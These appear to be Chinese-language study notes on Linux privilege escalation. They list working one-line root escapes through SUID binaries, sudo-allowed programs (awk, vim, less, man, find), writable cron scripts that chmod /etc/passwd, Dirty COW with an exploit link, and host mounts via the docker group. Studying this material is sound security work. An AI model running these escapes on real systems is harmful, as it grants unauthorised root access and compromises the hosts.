零 思路
（零）根本
详见《Linux根本认识》一文。



（一）内核提权
1 对目标系统进行信息收集，获取到系统内核版本以及发行版本；
2 根据内核版本获取其对应的漏洞以及EXP，这需要你去查；
3 使用找到的EXP对目标系统发起攻击，完成提权操作。



（二）SUID权限
1 原理：任何用户执行具备SUID权限的二进制文件都可在运行期间获得该文件的属主权限。

2 几个概念理解本质：
（1）Real UID：属主id；
（2）Effective UID：执行期间的UID。因而对于SUID权限而言，就是EUID在运行期间不是自己的RUID而是别的用户的RUID了。
（3）Saved UID：高权限用户将权后保留的UID。这个不重要。



（三）cron提权
脚本文件可让外人写，被cron以root执行，黑客可以往脚本文件里写入代码，继而执行任意命令。



（四）sudo提权
不知道root密码去提权。



（五）NFS提权



（六）docker提权







一 内核提权
（一）脏牛
1 漏洞编号：CVE-2016-5195
2 影响范围：Linux 内核2.6.22 – 3.9 (x86/x64)
3 exp：https://github.com/FireFart/dirtycow




二 S权限方法
（零）前提：find、flock、env、python这些命令具备SUID权限。
1 找到有哪些属于root用户的具有SUID权限的文件：find / -perm /ug=s -type f 2>/dev/null -exec ls -l {} \;
2 你可以通过上面的命令去查看find、flock、env、python这些命令是否具备SUID权限。



（一）find提权
1 命令：find 任意文件 -exec root权限命令 \;
2 exp：find . -exec /bin/bash \;
3 注意：exec执行的命令的权限是当前用户的权限，你要用sudo自然就变成了root权限但是还是需要输入当前用户密码这就是正常了，然而find如果由S权限，那么直接就可提权至root。



（二）flock提权
exp：flock -u / /bin/sh -p



（三）env提权
exp：env /bin/sh -p



（四）python提权
exp：python -c 'import os; os.execl("/bin/sh", "sh", "-p")'







三 cron提权
（一）条件：脚本文件可被外人写，cron以root执行该脚本。
（二）步骤：
1 查看crontab
cat /etc/crontab   // 一般给看
cat /var/spool/cron/crontabs/username   // 一般不给看
2 发现有脚本文件，去查看该脚本文件的权限。
3 发现能写，则写入exp。
（三）exp：
1 高权限命令。
2 一般的做法是（假设python）：
（1）让/etc/passwd可被别人写：os.chmod("/etc/passwd", stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
（2）构造超级用户。







四 sudo提权（场景限制：已经是sudo用户了）
（一）awk提权
1 命令：sudo awk '{BEGIN system("/bin/bash")}' S权限文件（比如/usr/bin/su）
2 exp：sudo awk 'BEGIN {system("/bin/bash")}'



（二）find提权
1 命令：sudo find 任意文件 -exec root权限命令 \;
2 exp：sudo find /etc/passwd -exec /bin/sh \;



（三）vim提权
1 命令：sudo vim -c 任意命令
2 exp：sudo vim -c '!/bin/bash'



（四）less提权
1 sudo less /etc/hosts
2 输入：!和Enter



（五）man提权
1 sudo man man
2 输入：!和Enter







五 nfs提权：详见nfs的mount的关键理解部分。







六 docker提权
0 原理（是什么缺陷造成了docker提权？）：
（0）前置知识：
a docker必须使用root权限操作。这就限制了黑客操作docker。
b docker安装好了以后，产生了一个docker用户和用户组作为docker的system用户，该用户组是有root权限的。对应缺陷1为黑客操作docker提供可能。
c docker容器内部的权限可以被配置为root权限，这一点是提权的关键。对应缺陷2为黑客获取docker的root权限提供可能
（1）缺陷在哪？（普通用户加入了docker组）
a 黑客能够执行docker命令：有的人为了方便，便将普通用户加入docker组；在企业环境中，很多时候管理员都会选择把员工的普通用户加入docker组，让员工可以在没有root权限下就使用docker。
b docker hub上很多的docker项目，甚至ubuntu这种docker官方镜像都是默认以root权限运行，其实在构建镜像的dockerfile文件中可以RUN useradd -m test-user等等创建普通用户，但是大多数人是嫌麻烦的，而且用root多好啊（除了不安全什么都好）。
（2）黑客正是利用了上面的缺陷进行提权。

1 提权手法
（1）手动方法：
a docker run -it -v /etc:/etc ubuntu /bin/bash
拉取并启动一个ubuntu镜像，开启交互，将/etc目录映射并覆盖ubuntu容器的/etc（目录映射导致修改容器内的/etc就相当于修改外部/etc）。
b 由于docker容器内部的权限是root权限，因而黑客可以通过修改/etc的某些文件实现提权，比如：
usermod -aG sudo <comman-user>
或者
在/etc/sudoers里添加comman-user为sudo。
等等
（2）自动手法：docker run -v /:/hostOS -it chrisfosterelli/rootplease
